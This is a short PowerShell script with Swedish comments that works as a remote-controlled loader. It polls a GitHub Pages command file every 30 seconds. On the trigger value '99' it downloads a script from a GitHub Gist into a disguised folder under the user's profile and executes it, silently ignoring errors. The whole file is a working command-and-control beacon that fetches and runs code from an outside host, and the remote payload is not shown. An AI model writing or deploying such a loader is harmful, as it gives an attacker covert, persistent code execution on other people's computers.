$commandUrl = "https://eliasadenas.github.io/ORM/command.txt"

# Klistra in din egna RAW-länk från din GitHub Gist här under:
$GistRawUrl = "https://gist.githubusercontent.com/Eliasadenas/20b6bf894db665b9af0238399a2d79ea/raw/script.ps1" 

# Sökvägen där filen sparas lokalt
$ScriptPath = "$env:USERPROFILE\Windows\script\script.ps1"

while ($true) {
    try {
        $command = (Invoke-WebRequest -Uri $commandUrl -UseBasicParsing).Content.Trim()
        
        if ($command -eq "99") {
            # Laddar ner koden från Gist och sparar den som script.ps1 i mappen
            Invoke-WebRequest -Uri $GistRawUrl -OutFile $ScriptPath -UseBasicParsing
            
            # Kör det nedladdade huvudskriptet
            & $ScriptPath
            
            # (Ordet "break" som låg här är nu borttaget!)
        }
    } catch {
        # Ignorera nätverksfel
    }
    Start-Sleep -Seconds 30
}
